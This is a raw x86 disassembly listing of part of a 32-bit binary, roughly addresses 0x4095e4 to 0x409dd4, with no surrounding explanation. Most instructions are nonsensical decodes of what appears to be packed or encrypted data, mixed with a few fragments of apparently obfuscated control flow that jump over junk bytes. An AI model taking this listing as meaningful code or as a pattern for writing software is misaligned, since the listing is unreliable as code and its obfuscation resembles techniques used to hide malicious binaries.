  4095e4:	bound  ebp,QWORD PTR [edi-0x2c236fea]
  4095ea:	call   0x406b0f
  4095ef:	jmp    0x409836
  4095f4:	loope  0x40958c
  4095f6:	jmp    0x3d73:0xf1606904
  4095fd:	clc    
  4095fe:	jmp    0x8e94:0x3eeaf64e
  409605:	fstp   TBYTE PTR [esi+0x7e]
  409608:	and    al,0x7c
  40960a:	jle    0x40968a
  40960c:	(bad)  
  40960d:	cmp    bl,al
  40960f:	push   cs
  409610:	(bad)  
  409611:	dec    esp
  409612:	out    0xd3,al
  409614:	popa   
  409615:	jo     0x409617
  409617:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409618:	jae    0x4095d8
  40961a:	jno    0x4095b2
  40961c:	(bad)  
  40961d:	clc    
  40961e:	sbb    ecx,eax
  409620:	int    0xc3
  409622:	popa   
  409623:	stos   BYTE PTR es:[edi],al
  409624:	xchg   esi,eax
  409625:	fcom   QWORD PTR [edi]
  409627:	ins    DWORD PTR es:[edi],dx
  409628:	xchg   edx,eax
  409629:	dec    edi
  40962a:	xor    al,0x9e
  40962c:	jo     0x409614
  40962e:	test   eax,0xbb8bed7b
  409633:	hlt    
  409634:	test   eax,0x7409a86c
  409639:	sahf   
  40963a:	loope  0x4095e2
  40963c:	mov    dh,0x54
  40963e:	inc    ecx
  40963f:	add    ecx,ebx
  409641:	xchg   edx,eax
  409642:	ins    DWORD PTR es:[edi],dx
  409643:	loope  0x4095f9
  409645:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409646:	jmp    0xef9ab250
  40964b:	mov    bh,dh
  40964d:	add    eax,0x2a1cf060
  409652:	(bad)  
  409654:	xchg   edi,eax
  409655:	pop    eax
  409656:	fdiv   QWORD PTR [ebx-0x6a2bbf78]
  40965c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40965d:	jbe    0x409655
  40965f:	push   edx
  409660:	aaa    
  409661:	aaa    
  409662:	pop    es
  409663:	dec    ecx
  409664:	jle    0x409683
  409666:	fdiv   QWORD PTR [edx]
  409668:	fadd   DWORD PTR ds:0x4a8a519
  40966e:	test   eax,0xcaba4caf
  409673:	leave  
  409674:	adc    ecx,DWORD PTR [edx+0x1d0ffa47]
  40967a:	fstp   QWORD PTR ds:0xf926aab4
  409680:	sbb    DWORD PTR [edx],ecx
  409682:	xor    al,0xab
  409684:	cmp    eax,0x908123b4
  409689:	cli    
  40968a:	addr16 xchg esi,eax
  40968c:	enter  0x34c8,0xa5
  409690:	inc    edx
  409691:	jbe    0x409641
  409693:	int    0x7
  409695:	(bad)  
  409696:	xlat   BYTE PTR ds:[ebx]
  409697:	xlat   BYTE PTR ds:[ebx]
  409698:	loop   0x409695
  40969a:	sbb    DWORD PTR [ecx-0x58],esi
  40969d:	call   0xb0ad:0x29218830
  4096a4:	fwait
  4096a5:	jge    0x4096e4
  4096a7:	das    
  4096a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096a9:	mov    WORD PTR [eax+0x78],gs
  4096ac:	sbb    eax,0xbd226f88
  4096b1:	call   0xf8ed:0x859fa1a0
  4096b8:	call   0xa6610595
  4096bd:	xchg   ah,dl
  4096bf:	sbb    ch,BYTE PTR [ebp+0x96e9bb0]
  4096c5:	xchg   edx,eax
  4096c6:	xor    bh,BYTE PTR [ebx-0x70]
  4096c9:	push   eax
  4096ca:	stos   DWORD PTR es:[edi],eax
  4096cb:	mov    eax,ds:0xbda9a395
  4096d0:	in     al,0xfa
  4096d2:	jge    0x409744
  4096d4:	ja     0x409660
  4096d6:	out    dx,al
  4096d7:	gs mov bl,al
  4096da:	mov    dl,0x69
  4096dc:	and    al,BYTE PTR [ebx+0x5b921114]
  4096e2:	out    dx,al
  4096e3:	pop    ecx
  4096e4:	adc    ch,ch
  4096e6:	ficomp DWORD PTR [edx+0x1e3c780b]
  4096ec:	(bad)  
  4096ed:	repnz sbb ah,BYTE PTR [esi+0x60]
  4096f1:	and    BYTE PTR [ebx-0x1fab9896],cl
  4096f7:	dec    edi
  4096f8:	les    esi,FWORD PTR [esi]
  4096fa:	pusha  
  4096fb:	jg     0x409732
  4096fd:	mov    bh,0x11
  4096ff:	lock addr16 pop edi
  409702:	cmp    DWORD PTR [edi],ebx
  409704:	and    DWORD PTR [eax],ebx
  409706:	jae    0x409742
  409708:	ss into 
  40970a:	lea    edi,[eax-0x14ccbecc]
  409710:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409711:	sub    BYTE PTR [esi],ch
  409713:	in     eax,0xb1
  409715:	rcr    DWORD PTR [edi+0x39],cl
  409718:	out    0x83,eax
  40971a:	sub    BYTE PTR [esi+0x21133f2d],dh
  409720:	sar    BYTE PTR [eax],cl
  409722:	adc    DWORD PTR [ebx+ebx*1+0x0],ebx
  409726:	hlt    
  409727:	sub    ecx,DWORD PTR [edi-0x58618fe4]
  40972d:	pop    ebx
  40972e:	cmc    
  40972f:	mov    al,ah
  409731:	push   edx
  409732:	js     0x409734
  409734:	adc    eax,0x9bec8217
  409739:	xchg   ebx,eax
  40973a:	and    BYTE PTR [ebx],al
  40973c:	jb     0x4096fb
  40973e:	daa    
  40973f:	into   
  409740:	inc    esi
  409741:	xchg   ebp,eax
  409742:	sub    al,0xf4
  409744:	jle    0x409776
  409746:	push   edi
  409747:	jge    0x409748
  409749:	stos   BYTE PTR es:[edi],al
  40974a:	mov    cl,0x62
  40974c:	adc    al,0xf0
  40974e:	mov    esp,0xc35b1d5b
  409753:	lea    ebp,[ebx]
  409755:	ret    0xba05
  409758:	aaa    
  409759:	aam    0x36
  40975b:	int    0xc0
  40975d:	push   ebp
  40975e:	mov    edi,ecx
  409760:	pop    edx
  409761:	push   ebp
  409762:	sub    ecx,DWORD PTR [esi+0x6c]
  409765:	mov    fs,ecx
  409767:	shl    BYTE PTR [edx],0x16
  40976a:	stc    
  40976b:	ror    DWORD PTR [edx],1
  40976d:	(bad)  
  40976e:	es sub eax,0xb6653e92
  409774:	xlat   BYTE PTR ds:[ebx]
  409775:	mov    dl,0x1b
  409777:	nop
  409778:	dec    ebp
  409779:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40977a:	jle    0x4097f5
  40977c:	out    dx,eax
  40977d:	xor    BYTE PTR [ecx],cl
  40977f:	xor    al,0xd5
  409781:	push   ss
  409782:	cli    
  409783:	retf   0x3b4b
  409786:	mov    edi,0xf5ffd139
  40978b:	data16 loope 0x4097fb
  40978e:	or     cl,al
  409790:	or     dh,ah
  409792:	mov    DWORD PTR [ebx-0x7c],ecx
  409795:	fucomi st,st(6)
  409797:	mov    ecx,DWORD PTR [ebx]
  409799:	pop    esp
  40979a:	adc    ecx,DWORD PTR es:[edi-0x561a086f]
  4097a1:	lea    ebp,[ebp+0xe489770]
  4097a7:	stos   BYTE PTR es:[edi],al
  4097a8:	retf   
  4097a9:	and    DWORD PTR [ebp-0x10],eax
  4097ac:	inc    eax
  4097ad:	adc    eax,0x3f081af5
  4097b2:	aaa    
  4097b3:	adc    eax,ebp
  4097b5:	iret   
  4097b6:	and    esp,0x272cd827
  4097bc:	xor    eax,esp
  4097be:	mov    esi,0x36798daa
  4097c3:	jmp    0x54e1:0xfcb6f3c1
  4097ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097cb:	and    esi,DWORD PTR [esp+ebp*2]
  4097ce:	cmc    
  4097cf:	pop    es
  4097d0:	in     eax,dx
  4097d1:	(bad)  
  4097d2:	adc    eax,eax
  4097d4:	push   esi
  4097d5:	jmp    0x143b:0x6ebdfaf9
  4097dc:	adc    DWORD PTR [ebp+ebp*4+0x3fd48d79],eax
  4097e3:	repz imul al
  4097e6:	pop    eax
  4097e7:	mov    esi,0x335c38bd
  4097ec:	push   ebp
  4097ed:	push   ecx
  4097ee:	(bad)  
  4097ef:	dec    esp
  4097f0:	push   ecx
  4097f1:	pop    ebp
  4097f2:	es int3 
  4097f4:	push   esp
  4097f5:	inc    ax
  4097f7:	in     eax,0x39
  4097f9:	loopne 0x40983f
  4097fb:	repnz jecxz 0x4097bc
  4097fe:	mov    eax,0x3ade5ee9
  409803:	jle    0x40984f
  409805:	dec    edi
  409806:	jge    0x409820
  409808:	stos   BYTE PTR es:[edi],al
  409809:	xor    edx,eax
  40980b:	inc    edx
  40980c:	aad    0x33
  40980e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40980f:	or     BYTE PTR [ecx-0x616d80f6],al
  409815:	sub    eax,ecx
  409817:	xor    BYTE PTR [eax-0x1e],ah
  40981a:	inc    edi
  40981b:	pop    esp
  40981c:	cwde   
  40981d:	es stc 
  40981f:	scas   al,BYTE PTR es:[edi]
  409820:	jb     0x40986c
  409822:	ins    DWORD PTR es:[edi],dx
  409823:	rcl    DWORD PTR [ebx],cl
  409825:	call   0xbff7:0x9638a4fc
  40982c:	sub    edx,0xfffffffa
  40982f:	adc    dl,BYTE PTR [ebx+esi*8]
  409832:	cmp    ebx,esp
  409834:	mov    edx,0xf4458bd6
  409839:	cmp    eax,ebx
  40983b:	je     0x40892f
  409841:	mov    eax,DWORD PTR [ebp-0x8]
  409844:	mov    eax,DWORD PTR [eax]
  409846:	pop    edi
  409847:	pop    esi
  409848:	pop    ebx
  409849:	leave  
  40984a:	ret    0xc
  40984d:	push   ebp
  40984e:	mov    ebp,esp
  409850:	sub    esp,0x30
  409853:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40985a:	add    ecx,0x13ba
  409860:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409867:	xor    ecx,ecx
  409869:	xor    ecx,DWORD PTR ds:0x43385f
  40986f:	xor    DWORD PTR ds:0x433797,ecx
  409875:	mov    ecx,DWORD PTR [ebp-0x4]
  409878:	push   ebx
  409879:	sub    eax,eax
  40987b:	mov    eax,0x7510854
  409880:	add    DWORD PTR ds:0x43385b,0x43382b
  40988a:	xor    ecx,eax
  40988c:	mov    ebx,0x32729b
  409891:	add    ecx,ebx
  409893:	or     DWORD PTR ds:0x4337e7,0x433893
  40989d:	mov    DWORD PTR [ebp-0x1c],ecx
  4098a0:	mov    ecx,DWORD PTR ds:0x43377b
  4098a6:	sub    DWORD PTR ds:0x43385f,ecx
  4098ac:	mov    ecx,DWORD PTR [ebp+0x14]
  4098af:	jmp    0x409b12
  4098b4:	shr    DWORD PTR [ebx+0x7570c4c2],0xc1
  4098bb:	stos   DWORD PTR es:[edi],eax
  4098bc:	fadd   st(6),st
  4098be:	cwde   
  4098bf:	pushf  
  4098c0:	lea    esi,[eax]
  4098c2:	repz dec eax
  4098c4:	mov    ah,0xd9
  4098c6:	jle    0x409946
  4098c8:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  4098cc:	mov    BYTE PTR [ebx+0x440d91f1],ch
  4098d2:	jae    0x4098b9
  4098d4:	sub    eax,0xf5ac41cb
  4098d9:	xor    ebp,DWORD PTR [eax]
  4098db:	push   ss
  4098dc:	push   ebx
  4098dd:	mov    ds:0x53893300,al
  4098e2:	sbb    edx,esi
  4098e4:	not    dl
  4098e6:	in     eax,0x66
  4098e8:	xor    al,0xba
  4098ea:	xchg   ecx,eax
  4098eb:	mov    ah,0x2a
  4098ed:	jp     0x4098f6
  4098ef:	xor    dh,al
  4098f1:	or     al,0xa7
  4098f3:	inc    ebp
  4098f4:	dec    ecx
  4098f5:	std    
  4098f6:	jne    0x40991e
  4098f8:	mov    bl,0x6
  4098fa:	and    eax,0x9d25f898
  4098ff:	clc    
  409900:	inc    edi
  409901:	jge    0x4098cb
  409903:	punpckldq mm5,DWORD PTR [esi+0x18485fd7]
  40990a:	adc    eax,0x89ff417a
  40990f:	add    ch,BYTE PTR [edx]
  409911:	pop    esp
  409912:	mov    esi,ebx
  409914:	mov    bh,0xf6
  409916:	call   0xde431de4
  40991b:	aad    0x17
  40991d:	mov    dh,BYTE PTR [eax]
  40991f:	xor    DWORD PTR [ebp-0xa],ebx
  409922:	sahf   
  409923:	ins    DWORD PTR es:[edi],dx
  409924:	push   ds
  409925:	sub    DWORD PTR [eax],eax
  409927:	dec    esp
  409928:	mov    esp,0xf419a984
  40992d:	mov    dl,0xfe
  40992f:	bt     DWORD PTR [eax+0xcec137f],ebp
  409936:	call   0x35afd41e
  40993b:	dec    eax
  40993c:	mov    eax,0x43058a6b
  409941:	xor    dl,BYTE PTR [ecx-0x50]
  409944:	into   
  409945:	xchg   ecx,eax
  409946:	retf   
  409947:	fwait
  409948:	inc    ebp
  409949:	and    DWORD PTR [esp+ebx*4-0x2cf7bf12],edi
  409950:	mov    ebx,0xf7d8da2
  409955:	mov    ch,0x88
  409957:	in     al,0xf
  409959:	js     0x40994f
  40995b:	mov    bh,0x23
  40995d:	and    cl,BYTE PTR ds:0x17ac2d62
  409963:	fiadd  WORD PTR [edx]
  409965:	popf   
  409966:	cmp    DWORD PTR [edi+0x7010a92],edi
  40996c:	dec    eax
  40996d:	jmp    0x9be6:0xb75b9a59
  409974:	inc    edx
  409975:	shr    esi,1
  409977:	repnz loop 0x409903
  40997a:	dec    edi
  40997b:	mov    bh,0xaf
  40997d:	stos   DWORD PTR es:[edi],eax
  40997e:	cmp    eax,0x2d89c45f
  409983:	or     ecx,ebx
  409985:	int3   
  409986:	adc    DWORD PTR [esp+ecx*8],ebp
  409989:	ds push edi
  40998b:	jg     0x409944
  40998d:	fisub  DWORD PTR [edx+0x4f32bb72]
  409993:	sub    al,0x44
  409995:	cli    
  409996:	test   DWORD PTR [ebp+0x1c11f522],0x5dda490
  4099a0:	fs jl  0x409a10
  4099a3:	mov    ah,BYTE PTR [ecx+0x36]
  4099a6:	ins    BYTE PTR es:[edi],dx
  4099a7:	and    bl,BYTE PTR [eax+0x50]
  4099aa:	xor    BYTE PTR [edi-0x6a589cce],al
  4099b0:	push   esi
  4099b1:	stc    
  4099b2:	xor    DWORD PTR [ebp+eax*4+0x19f84d2e],edi
  4099b9:	inc    eax
  4099ba:	aam    0x84
  4099bc:	sahf   
  4099bd:	adc    eax,0x7b370606
  4099c2:	dec    ecx
  4099c3:	or     al,BYTE PTR [esi-0x33]
  4099c6:	test   DWORD PTR [bx+si],ebp
  4099c9:	inc    ebp
  4099ca:	loopne 0x4099fc
  4099cc:	ret    0x1228
  4099cf:	pop    ebp
  4099d0:	mov    edx,0xb42bfb3b
  4099d5:	shld   DWORD PTR ds:0xc7fb5d03,ecx,cl
  4099dc:	cmp    bl,BYTE PTR [esi-0x54]
  4099df:	(bad)  
  4099e0:	sub    al,0x8c
  4099e2:	adc    al,0x3c
  4099e4:	mov    esp,0xc57e84f7
  4099e9:	xchg   edx,eax
  4099ea:	clc    
  4099eb:	sub    bl,bl
  4099ed:	shl    ebx,cl
  4099ef:	test   BYTE PTR [eax-0x7a],ah
  4099f2:	in     al,dx
  4099f3:	adc    esi,esp
  4099f5:	ins    BYTE PTR es:[edi],dx
  4099f6:	les    esp,FWORD PTR [ebp+0x6b]
  4099f9:	push   eax
  4099fa:	sub    eax,0x569ccc2f
  4099ff:	test   al,0x4f
  409a01:	daa    
  409a02:	ds call 0xa37170de
  409a08:	outs   dx,BYTE PTR ds:[esi]
  409a09:	xor    BYTE PTR [esi],ah
  409a0b:	imul   esi,DWORD PTR [ecx+0x6d],0xffffffe9
  409a0f:	sub    BYTE PTR [eax+0x7ae501f5],ah
  409a15:	aas    
  409a16:	xchg   edx,eax
  409a17:	jmp    FWORD PTR [esi-0x7e]
  409a1a:	push   ecx
  409a1b:	cli    
  409a1c:	(bad)  
  409a1d:	shl    dl,cl
  409a1f:	dec    edx
  409a20:	je     0x4099b8
  409a22:	or     al,0xc6
  409a24:	(bad)
  409a27:	mov    al,ds:0x20277e52
  409a2c:	dec    edx
  409a2d:	out    0x1c,eax
  409a2f:	add    esp,DWORD PTR [eax-0x43543382]
  409a35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a36:	popf   
  409a37:	mov    cl,0xc2
  409a39:	loop   0x4099cc
  409a3b:	add    ch,BYTE PTR [esi+0x3e]
  409a3e:	int    0xa1
  409a40:	daa    
  409a41:	data16 jge 0x409a77
  409a44:	adc    eax,0xd60ee9a7
  409a49:	adc    esi,DWORD PTR [edi+0x6f]
  409a4c:	sahf   
  409a4d:	dec    esp
  409a4e:	mov    esp,0x62b4f42c
  409a53:	shrd   DWORD PTR [ecx],edi,cl
  409a56:	addr16 cmp al,0xd0
  409a59:	xchg   BYTE PTR [ecx-0x3baecb19],dh
  409a5f:	mov    esp,eax
  409a61:	push   esi
  409a62:	mov    eax,0x7fce4bd3
  409a67:	call   0xd5100bc3
  409a6c:	ds jne 0x409ad7
  409a6f:	ror    BYTE PTR [ebp+eiz*1-0x7de8235b],0x2e
  409a77:	jo     0x409aa9
  409a79:	int    0xc7
  409a7b:	bound  edi,QWORD PTR [edx]
  409a7d:	push   edi
  409a7e:	jg     0x409afe
  409a80:	fwait
  409a81:	nop
  409a82:	mov    edi,0x81a3792c
  409a87:	stos   BYTE PTR es:[edi],al
  409a88:	or     cl,al
  409a8a:	(bad)  
  409a8b:	std    
  409a8c:	sub    BYTE PTR [esi-0x18],bl
  409a8f:	out    dx,eax
  409a90:	jmp    0xf2252632
  409a95:	mov    ds:0x2d2a8aae,al
  409a9a:	pop    esi
  409a9b:	out    dx,eax
  409a9c:	cmp    al,0x48
  409a9e:	sub    BYTE PTR [edx+eiz*1],0x70
  409aa2:	xlat   BYTE PTR ds:[ebx]
  409aa3:	fbstp  TBYTE PTR [eax]
  409aa5:	into   
  409aa6:	sbb    ebx,DWORD PTR [edi]
  409aa8:	pop    eax
  409aa9:	call   0xac35:0x5cd83df3
  409ab0:	push   cs
  409ab1:	cmc    
  409ab2:	gs xor al,0x18
  409ab5:	dec    esi
  409ab6:	dec    edx
  409ab7:	or     ebx,ebp
  409ab9:	in     al,dx
  409aba:	iret   
  409abb:	mov    al,0x4f
  409abd:	adc    eax,0x24667c78
  409ac2:	lods   eax,DWORD PTR ds:[esi]
  409ac3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ac4:	inc    edx
  409ac5:	neg    DWORD PTR [ecx]
  409ac7:	and    eax,esi
  409ac9:	sbb    ecx,DWORD PTR cs:[esi]
  409acc:	gs pop edi
  409ace:	sbb    dl,BYTE PTR [ebp+0x83ae77]
  409ad4:	push   0x612b933d
  409ad9:	aad    0xd7
  409adb:	and    eax,0xcd8eeaf2
  409ae0:	adc    BYTE PTR [eax],ah
  409ae2:	loope  0x409a70
  409ae4:	je     0x409b54
  409ae6:	fbstp  TBYTE PTR [edx-0x5a]
  409ae9:	not    BYTE PTR [esi]
  409aeb:	cld    
  409aec:	mov    ds:0xa4ecacb0,eax
  409af1:	push   ecx
  409af2:	or     cl,BYTE PTR [ebx-0x74bc20d4]
  409af8:	pop    esp
  409af9:	in     eax,0x34
  409afb:	mov    WORD PTR [ecx-0x4ce3be9c],?
  409b01:	mov    bl,0xba
  409b03:	and    bl,BYTE PTR [eax]
  409b05:	jle    0x409aa4
  409b07:	jne    0x409b4d
  409b09:	aas    
  409b0a:	pop    ss
  409b0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b0c:	inc    eax
  409b0d:	mov    ecx,0x3dbb4aab
  409b12:	push   esi
  409b13:	push   edi
  409b14:	sbb    DWORD PTR ds:0x43381f,0x4337d3
  409b1e:	jmp    0x409d81
  409b23:	lds    esp,FWORD PTR [edi-0x2e932d54]
  409b29:	popa   
  409b2a:	mov    cl,0x92
  409b2c:	fisttp QWORD PTR [edi+0x4e9bb3d4]
  409b32:	loopne 0x409bb2
  409b34:	in     al,0x7e
  409b36:	jle    0x409b70
  409b38:	jl     0x409bb8
  409b3a:	jle    0x409b9b
  409b3c:	out    0x1f,al
  409b3e:	mov    edx,DWORD PTR [edi]
  409b40:	jnp    0x409ae1
  409b42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b43:	xchg   esp,eax
  409b44:	mov    ah,0x8a
  409b46:	loopne 0x409b6f
  409b48:	sbb    al,0x72
  409b4a:	je     0x409b7b
  409b4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b4d:	cld    
  409b4e:	xchg   esp,eax
  409b4f:	and    DWORD PTR [ecx+0x4e77d584],ebp
  409b55:	mov    al,0x69
  409b57:	or     cl,BYTE PTR [edx+0x190b23eb]
  409b5d:	jno    0x409adf
  409b5f:	xlat   BYTE PTR ds:[ebx]
  409b60:	es stos BYTE PTR es:[edi],al
  409b62:	pop    esi
  409b63:	pop    es
  409b64:	ds adc eax,0x915f570c
  409b6a:	push   edx
  409b6b:	dec    ebx
  409b6c:	xor    DWORD PTR [edx+0x2a03d337],edx
  409b72:	cmp    edx,DWORD PTR [ebp-0x21bf1b11]
  409b78:	cmp    ch,dh
  409b7a:	inc    ebp
  409b7b:	ror    BYTE PTR [ebp+0xa],0x6a
  409b7f:	mov    bh,0x91
  409b81:	out    0x6f,al
  409b83:	sub    DWORD PTR [edx+edx*4-0x29b2e29e],0xffffff97
  409b8b:	mov    edx,0x26727175
  409b90:	xchg   ebx,eax
  409b91:	ror    DWORD PTR [esi-0xf20a7e5],0x53
  409b98:	pop    di
  409b9a:	xchg   esp,eax
  409b9b:	pop    ds
  409b9c:	xchg   edx,eax
  409b9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b9e:	jecxz  0x409b41
  409ba0:	dec    edx
  409ba1:	mov    edi,0xfd4fbd6d
  409ba6:	dec    edx
  409ba7:	(bad)  
  409ba9:	fld    TBYTE PTR [ebx]
  409bab:	inc    ecx
  409bac:	retf   
  409bad:	push   ecx
  409bae:	pusha  
  409baf:	ret    
  409bb0:	pop    edi
  409bb1:	pushf  
  409bb2:	mov    esp,0x6117bd5b
  409bb7:	test   DWORD PTR [ebp-0x15],0x7da2387e
  409bbe:	ficomp WORD PTR [eax+eiz*8+0x50]
  409bc2:	mov    bh,0x80
  409bc4:	xchg   ebx,eax
  409bc5:	sbb    DWORD PTR [esi+esi*4-0x54],0xffffffdf
  409bca:	cli    
  409bcb:	mov    ecx,0x54004116
  409bd0:	ds je  0xfd27e70e
  409bd7:	inc    ebx
  409bd8:	jge    0x409c14
  409bda:	imul   ebp,DWORD PTR [edi-0x51],0x788afbdd
  409be1:	mov    ah,0x57
  409be3:	mov    WORD PTR [edx+0x6f],ss
  409be6:	cld    
  409be7:	sbb    BYTE PTR [ebp+0x4f27b4e2],0xb
  409bee:	cmp    dl,cl
  409bf0:	sti    
  409bf1:	fwait
  409bf2:	cmp    BYTE PTR [esi+ebx*4],0x4f
  409bf6:	fbld   TBYTE PTR [edi-0x2b]
  409bf9:	cld    
  409bfa:	add    DWORD PTR [edx-0x11],0xffffffa9
  409bfe:	adc    esp,esp
  409c00:	push   es
  409c01:	not    BYTE PTR [esi+0x1b]
  409c04:	int3   
  409c05:	dec    edx
  409c06:	int3   
  409c07:	stos   DWORD PTR es:[edi],eax
  409c08:	mov    edx,eax
  409c0a:	jmp    0x9f15:0x31e840f6
  409c11:	jmp    0xdc63:0x8b8f3e6d
  409c18:	inc    ecx
  409c19:	push   eax
  409c1a:	popa   
  409c1b:	outs   dx,DWORD PTR ds:[esi]
  409c1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c1d:	sub    ecx,eax
  409c1f:	mov    edi,0x4b774da1
  409c24:	loopne 0x409bef
  409c26:	popf   
  409c27:	xchg   ebp,eax
  409c28:	sbb    dl,BYTE PTR [eax+0x78481319]
  409c2e:	(bad)  
  409c2f:	mov    ch,BYTE PTR [ebx+0x5a]
  409c32:	mov    ebx,0x9ee50486
  409c37:	pop    ebx
  409c38:	jle    0x409c6e
  409c3a:	dec    edi
  409c3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c3c:	jnp    0x409bf7
  409c3e:	in     al,dx
  409c3f:	mov    ebp,eax
  409c41:	pusha  
  409c42:	stos   BYTE PTR es:[edi],al
  409c43:	iret   
  409c44:	or     eax,0x78dbca66
  409c49:	lods   al,BYTE PTR ds:[esi]
  409c4a:	or     DWORD PTR ds:[ebx-0x67],eax
  409c4e:	mov    ecx,0xc7a6010c
  409c53:	(bad)  
  409c54:	in     eax,dx
  409c55:	sbb    al,0x4a
  409c57:	test   al,0xc8
  409c59:	out    dx,al
  409c5a:	pop    ebp
  409c5b:	test   al,0x1e
  409c5d:	cmp    al,0x5
  409c5f:	push   eax
  409c60:	(bad)  
  409c61:	js     0x409cc0
  409c63:	test   DWORD PTR [ebp-0x5e9c94c7],ecx
  409c69:	stos   DWORD PTR es:[edi],eax
  409c6a:	nop
  409c6b:	xor    cl,BYTE PTR [edi-0x3d0421ad]
  409c71:	sahf   
  409c72:	inc    eax
  409c73:	sbb    eax,DWORD PTR [edi-0x57]
  409c76:	dec    esi
  409c77:	jmp    0x3178465f
  409c7c:	push   esi
  409c7d:	mov    esi,0x49277bfb
  409c82:	and    al,BYTE PTR [edx+eax*1]
  409c85:	push   ebx
  409c86:	and    ebp,DWORD PTR [eax+0x50ab1ca0]
  409c8c:	add    esp,ecx
  409c8e:	inc    edx
  409c8f:	xchg   BYTE PTR [edx+0x6ad2a75a],al
  409c95:	add    BYTE PTR [ecx],bh
  409c97:	and    eax,0xa6139892
  409c9c:	hlt    
  409c9d:	(bad)  
  409c9e:	or     al,0x51
  409ca0:	push   esi
  409ca1:	clc    
  409ca2:	pusha  
  409ca3:	leave  
  409ca4:	mov    DWORD PTR [esi],edi
  409ca6:	xor    al,0xaa
  409ca8:	xadd   BYTE PTR [edx],bl
  409cab:	mov    edx,0x30b4457c
  409cb0:	push   0xfffffffe
  409cb2:	or     eax,0xf60a5ac7
  409cb7:	sti    
  409cb8:	sbb    eax,DWORD PTR [edi]
  409cba:	adc    ebp,ebp
  409cbc:	outs   dx,BYTE PTR ds:[esi]
  409cbd:	loop   0x409d25
  409cbf:	mov    ecx,edx
  409cc1:	inc    eax
  409cc2:	inc    eax
  409cc3:	call   0x9ca9:0xeb754d0e
  409cca:	inc    ecx
  409ccb:	sub    DWORD PTR [ebp+0x5b8ac88a],ecx
  409cd1:	sbb    eax,0xefdb9a21
  409cd6:	lds    eax,FWORD PTR [ecx-0x5e]
  409cd9:	mov    ah,0xf2
  409cdb:	lock nop
  409cdd:	mov    ch,0x67
  409cdf:	push   esi
  409ce0:	imul   esp,DWORD PTR [ebp-0x226f96e7],0x78f0fa2d
  409cea:	jp     0x409d5d
  409cec:	jno    0x409d2b
  409cee:	push   ss
  409cef:	pop    ds
  409cf0:	into   
  409cf1:	push   ds
  409cf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409cf3:	fist   WORD PTR [ebx+0xe9da79c]
  409cf9:	mov    cl,0xa3
  409cfb:	mov    al,ds:0x98a67db6
  409d00:	sub    ebx,DWORD PTR ds:[eax-0x5a19531d]
  409d07:	dec    eax
  409d08:	scas   eax,DWORD PTR es:[edi]
  409d09:	adc    al,ah
  409d0b:	push   edi
  409d0c:	mov    BYTE PTR [esi-0x1c],al
  409d0f:	mov    ebx,0x119c565e
  409d14:	arpl   WORD PTR [esi+edx*4-0x45],cx
  409d18:	jns    0x409d63
  409d1a:	or     ecx,DWORD PTR [ecx]
  409d1c:	add    ebx,ecx
  409d1e:	pusha  
  409d1f:	add    BYTE PTR [eax+0x28],ah
  409d22:	vpaddw xmm1,xmm1,XMMWORD PTR [esp+ebx*1-0x6]
  409d28:	or     DWORD PTR [ebp+eax*4-0x66],ecx
  409d2c:	push   ds
  409d2d:	xor    cl,BYTE PTR [ecx+0x4aded2a2]
  409d33:	enter  0xb08a,0x6
  409d37:	enter  0x3f07,0x9
  409d3b:	(bad)  
  409d3d:	and    eax,0xc07b5e96
  409d42:	not    DWORD PTR [esi*2+0x5b1ff21b]
  409d49:	pmaxsw mm0,mm4
  409d4c:	outs   dx,DWORD PTR ds:[esi]
  409d4d:	ret    
  409d4e:	call   0x7c09:0x87dfaf57
  409d55:	daa    
  409d56:	push   ecx
  409d57:	aaa    
  409d58:	imul   esi,edi,0x92ba9453
  409d5e:	out    0xb8,al
  409d60:	aad    0x69
  409d62:	dec    ebp
  409d63:	repnz and ch,ch
  409d66:	mov    bl,0x6c
  409d68:	mov    ebx,0x4ba4a7fb
  409d6d:	pop    esp
  409d6e:	sub    eax,0x88e2c92d
  409d73:	outs   dx,BYTE PTR ds:[esi]
  409d74:	cmp    edx,DWORD PTR [edx+esi*4]
  409d77:	xchg   DWORD PTR [edi+0x64],ebp
  409d7a:	push   ds
  409d7b:	pop    eax
  409d7c:	pop    edi
  409d7d:	mov    bh,BYTE PTR [edx+ebx*1-0x38367a91]
  409d84:	add    eax,0x433797
  409d89:	out    0x34,eax
  409d8b:	add    BYTE PTR [eax],al
  409d8d:	je     0x409da7
  409d93:	mov    ecx,DWORD PTR [ebp+0x14]
  409d96:	mov    edi,DWORD PTR ds:0x43378b
  409d9c:	sub    DWORD PTR ds:0x43385f,edi
  409da2:	mov    ecx,DWORD PTR [ecx]
  409da4:	mov    DWORD PTR [ebp-0x1c],ecx
  409da7:	or     DWORD PTR ds:0x4337d3,ebx
  409dad:	jmp    0x40a010
  409db2:	push   eax
  409db3:	call   FWORD PTR [esi+0x50697168]
  409db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dba:	or     al,0x5f
  409dbc:	inc    edi
  409dbd:	pop    es
  409dbe:	adc    bl,dl
  409dc0:	mov    eax,ds:0x7ee238c3
  409dc5:	jle    0x409dff
  409dc7:	jl     0x409e47
  409dc9:	jle    0x409d59
  409dcb:	pop    esp
  409dcc:	mov    ds:0x457e0a02,eax
  409dd1:	and    BYTE PTR [eax],ch
  409dd3:	das    
  409dd4:	mov    ch,0x35
